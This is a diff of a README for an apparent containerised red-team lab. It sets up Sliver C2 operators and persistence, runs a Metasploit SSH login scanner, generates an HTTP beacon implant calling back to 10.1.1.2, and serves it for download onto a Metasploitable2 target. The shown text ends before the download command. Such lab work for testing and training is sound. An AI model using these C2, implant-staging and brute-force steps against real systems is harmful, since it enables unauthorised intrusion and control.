@@ -6,7 +6,29 @@ Go to Ender directory
 docker compose up -d --build
 ```
 
-Testing the connectivity between server and metasploit
+#### Setting Sliver Persistence (FIRST TIME BUILDING)
+In one terminal (Sliver Server):
+```bash
+docker exec -it operator /bin/bash
+cd /opt/sliver 
+sliver-server
+> new-operator --name operator1 --lhost 10.1.1.2
+> multiplayer
+```
+Creates /opt/sliver/operator1_10.1.1.2.cfg
+
+
+In second terminal (Sliver Client):
+```bash
+docker exec -it operator /bin/bash
+cd /opt/sliver
+sliver-client import operator1_10.1.1.2.cfg
+```
+Saves to /root/.sliver-client/configs/operator1_10.1.1.2.cfg
+
+### From Now On, if you build down and up or start and stop containers, sliver configuration persists (test by running docker compose down and rebuilding before continuing)
+
+#### Testing Ender server and metasploit
 
 To try out CLI
 Terminal 1:
@@ -38,7 +60,7 @@ run exploit/auxiliary "module_name"
 
 Type in parameters when needed
 
-Example of "run exploit" with scanner/ssh/ssh_login:
+Example of "run exploit/auxiliary" with scanner/ssh/ssh_login:
 ```bash
 [SERVER] Received: [+] Connected to Metasploit!
 Enter message (or 'quit' to exit): run auxiliary scanner/ssh/ssh_login
@@ -55,45 +77,45 @@ Enter message (or 'quit' to exit):
 [SERVER] Received: {"job_id": 0, "uuid": "KFgCxXFIFQ3i5iIzQeE9FHBJ"}
 ```
 
-## To run Eshu code:
-Start up terminal
+Do NOT CLOSE Ender Server or Client while continuing
+
+## To run Eshu's main.py code:
+Start up new terminal
 ```console
 docker exec -it operator /bin/bash
 ```
 
-To test network connection to vulnerable machine(VM)
+To test network connection to vulnerable machine(VM) OPTIONAL
 ```bash
-ping 10.1.1.3
+ping -c 4 10.1.1.3
 nmap -l metasploitable2
 ```
 
-#### Firstly, setting up Sliver Server
+#### Firstly, setting up beacon
 In one terminal (Sliver Server):
 ```bash
-docker exec -it operator /bin/bash
-sliver-server
-> new-operator --name operator1 --lhost localhost
+docker exec -it operator /bin/bash 
+root@operator:/workspace/enderCLI# sliver-server
 > multiplayer
 ```
+***MUST INCLUDE MULTIPLAYER***
 
-#### Secondly, setting up Sliver Client instance
 In second terminal (Sliver Client):
 ```bash
 docker exec -it operator /bin/bash
-sliver-client import operator1_localhost.cfg
-sliver-client
+root@operator:/workspace/enderCLI# sliver-client
 > generate beacon --seconds 5 --jitter 0 --http 10.1.1.2 --os linux --arch amd64 --name testbeacon
 > http	
 ```
 
-#### Thirdly, set up server to transfer implant for exploitation
+#### Secondly, set up server to transfer implant for exploitation
 In third terminal (operator workspace):
 ```bash
 docker exec -it operator /bin/bash
-python -m http.server 8080
+root@operator:/workspace/enderCLI# python -m http.server 8080
 ```
 
-#### Fourth, download and run implant on vulnerable machine
+#### Thirdly, download and run implant on vulnerable machine
 In fourth terminal (metasploitable2):
 ```bash
 docker exec -it metasploitable2 /bin/bash
